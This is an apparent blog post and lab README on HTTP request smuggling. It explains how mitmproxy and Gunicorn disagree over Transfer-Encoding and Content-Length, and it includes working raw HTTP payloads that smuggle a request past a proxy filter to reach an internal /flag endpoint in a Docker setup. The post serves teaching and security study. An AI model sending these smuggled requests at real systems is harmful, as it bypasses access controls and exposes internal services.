# Request smuggling

With more and more techniques being built on top of others, it’s getting more difficult for a developer to understand what is actually happening when he writes some code. On top of this the DevOps movement is progressing, where a developer is also supposed to know something about the infrastructure the code runs on. I think for a developer knowing how things work under the hood is not always necessary, but it helps choose better solutions and decreases the amount of mistakes made.

In this blog post I’ll be taking a look at request smuggling, which could utilize a wrongly configured proxy to ‘smuggle’ HTTP requests out of the network. For example responses from endpoints which are supposed to be inaccessible from the internet can be smuggled out of the network by a malicious user. I’ll be diving a bit into the HTTP protocol to show how this is possible. Based on what seems like harmless configuration of a proxy and a webserver I’ll also be giving a working examples of request smuggling.

This repository contains the needed Dockerfiles and docker-compose file to spin up an environment vulnerable to request smuggling. The clients to trigger request smuggling are in the clients folder.

## HTTP requests

An HTTP request always follows a specification which can be found in the [rfc2616 spec](https://tools.ietf.org/html/rfc2616). This specification describes how HTTP should work in an abstract way and I’ll be referring to it later on. All proxies, webservers and HTTP clients should follow this specification.

An HTTP request can include a body, where the length of this body must be indicated. Two ways to do this are:

- Using the `Content-Length` header, where the value is an integer indicating the amount of characters the body exists of.
- Using chunked encoding, where the `Transfer-Encoding` header has the value `chunked`. The body will be cut up in chunks, where every chunk is preceded by a hexidecimal number indicating the amount of characters the following chunk exists of. The last chunk to indicate the body is finished is empty and has the length `0`
- If both are provided, the chunked encoding takes priority for indicating the length of the body

The body of an HTTP request always begins with an empty line after the headers and also ends with an empty line.

## Abusing HTTP body length

Although the specification seems to be quite clear, it still depends on the developer of the HTTP client and server to implement this correctly. The abstraction of the specification makes it sometimes hard to translate this to code. It could be possible that the specification is interpreted differently between proxies, servers and clients. It would also be possible to interpretate the length of the body of a HTTP request differently. Let's see what we can do with this.

So, what will happen if I can trick a proxy into using the content length and the server using chunked encoding? They will have different interpretations of the length of the body. We can abuse this, as can be seen in the following example:

```http
GET /hello HTTP/1.1
Host: mywebsite.com
Content-Length: 11
Transfer-Encoding: chunked

0

smuggled

```

The proxy uses the content length 11 to decide the body length. Of course line breaks are also included in the length of the body, so the real body is `0\n\nsmuggled` which is 11 characters long. The proxy thinks this is a single message which includes smuggled in the body, but the server thinks otherwise. The server uses chunked encoding and it will thus think the body ends with the `0`, because that's how chunked encoding works. The server will think `smuggled` is part of the next message, which in this case is not a valid HTTP message and will be ignored. This doesn't seem harmful at first, but in some setups this could be abused to smuggle requests. How this is done will be shown in the next paragraph with a possible real-life scenario.

## Request smuggling using Mitmproxy and Gunicorn

The last paragraph has the assumption that a proxy and server intepretate the headers differently. This [blog](https://blog.deteact.com/gunicorn-http-request-smuggling) describes a writeup for a CTF where it was necessary to abuse request smuggling. In the CTF challenge the setup used mitmproxy as the proxy and Gunicorn for the server. If you look at the code how they implement the parsing of the `Transfer-Encoding` header the issue is quite easy to spot:

```python
# from https://github.com/mitmproxy/mitmproxy/blob/master/mitmproxy/net/http/http1/read.py#L78
    if "chunked" in headers.get("transfer-encoding", "").lower():
        return None
```

```python
# from https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/message.py#L134
    elif name == "TRANSFER-ENCODING":
        if value.lower() == "chunked":
            chunked = True
```

Mitmproxy checks whether `chunked` is in the header, while Gunicorn checks whether the whole value of the header matches `chunked`. So if we sent a header which has as value `chunkedasd`, mitmproxy will parse the body using chunked encoding, while Gunicorn will fall back on the content length.

The blogpost nicely describes how this can be exploited in the CTF, but I thought it would be better to simplify the setup and write my own exploit. In this repository I created this setup using Docker and Python clients to execute the request smuggling. The question still remains how can we abuse this mismatch between the proxy and the server? In the demo setup I made we have a `/flag` endpoint which returns a secret which is only reachable from within the network, because the proxy blocks the request:

```shell
$ curl localhost:8002/flag
Forbidden, but nice try ;)
```

This check is done by the proxy by checking the path that is called, but this check doesn't do anything with the body. So we can make a request which looks as follows:

```http
# Request
GET /hello HTTP/1.1
Host: 0.0.0.0:8002
Content-Length: 4
Transfer-Encoding: asdchunked

2a
GET /flag HTTP/1.1
Host: 0.0.0.0:8002


0

# Response
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Content-Length: 12

Hello there

```

The request looks quite similar to the one in the previous paragraph, except that the body is now replaced with another HTTP request. What will happen is that the proxy will think this is a single HTTP message which passes the `/flag` filter. The server meanwhile thinks the request ends with 2a (including double line breaks `\r\n`) and thinks what comes next is a new HTTP request. What follows is a valid HTTP request calling the `/flag` endpoint, returning the response to the proxy. But there is still a problem left, since the proxy thinks it only received a single request from the user, it will only return a single response. So although the proxy received two respones from the server, it thinks it only has to return a single response, leaving our `/flag` response hanging at the proxy. The solution to still get back this response is quiet simple:

```http
# Request
GET /hello HTTP/1.1
Host: 0.0.0.0:8002
Content-Length: 4
Transfer-Encoding: asdchunked

2a
GET /flag HTTP/1.1
Host: 0.0.0.0:8002


0

GET /hello HTTP/1.1
Host: 0.0.0.0:8002

# Response
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Content-Length: 12

Hello there

HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Content-Length: 12

THIS_IS_FLAG

```

By sending an extra request, the proxy will process it normally and return the response from the proxy. The proxy thinks it sent two `/hello` requests to the proxy and will thus return two responses to the user. The proxy actually returned three responses in the following order: `/hello`, `/flag`, `/hello`. It will thus return the first `/hello` response and the `/flag` response, leaving the second `/hello` response hanging. We could of course retrieve this response by doing another call, but the response of this call will than be left at the proxy.

So with these HTTP requests we managed to bypass the filter on the proxy and reach an internal endpoint, which shouldn't be reachable from outside the network.

## Other smuggle techniques

In the example above the proxy uses the `Transfer-Encoding` (TE) header and the server uses the `Content-Length` (CL) header. This is called TE-CL request smuggling, but there are of course more possibilities:

- **CL-TE**: for an example see [this writeup](https://ctftime.org/writeup/20655). This setup is also included in this repository.
- **CL-CL**: for example if we supply multiple `Content-Length` headers, there could be different interpretations about which one indicates the length of the body.
- **TE-TE**: for example if there are multiple chunks with length `0`, there could be different interpretations about which one is the real indication of the end of the body.

In this post we played around with the lenght of the body to smuggle an additional request, but there are of course other ways to achieve this. Take for example [this post](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c), in which is described how upgrading a HTTP/1.1 connection to HTTP/2 allows smuggling of requests.

In my opinion request smuggling can be abstracted as follows:

- A client calls an external facing component (for example a proxy), which forwards the request to an internal facing component (for example a server)
- The internal facing component can't be reached by the client
- The external facing component checks the request of the user and denies requests based on a filter/policy/etc
- A request is smuggled past the checks of the external facing component to the internal facing component
- The smuggled request could have different results:
  - An internal process is triggered that shouldn't be done from outside of the network
  - A request is returned to the client from the internal facing component that shouldn't be returned to a client outside of the network
- The way the external facing component check is bypassed depends on the protocol and the way checks are made (HTTP/1.1, HTTP/2, WebSockets, gRPC, etc)

Since protocols keep evolving and new ones are added, I think there is no permanent fix for request smuggling.

## Closing notes

I hope this post was interesting to read and allowed you to learn a bit more about the possibilities with techniques we work with every day. By diving into this topic, I myself learned a lot about how HTTP clients and servers work (I also wrote them myself in Python) and how to interpret a IETF specification (which as it seemed is pretty important). Luckily techniques are always evolving and it seems they keep increasing, so there's always more to dive into!
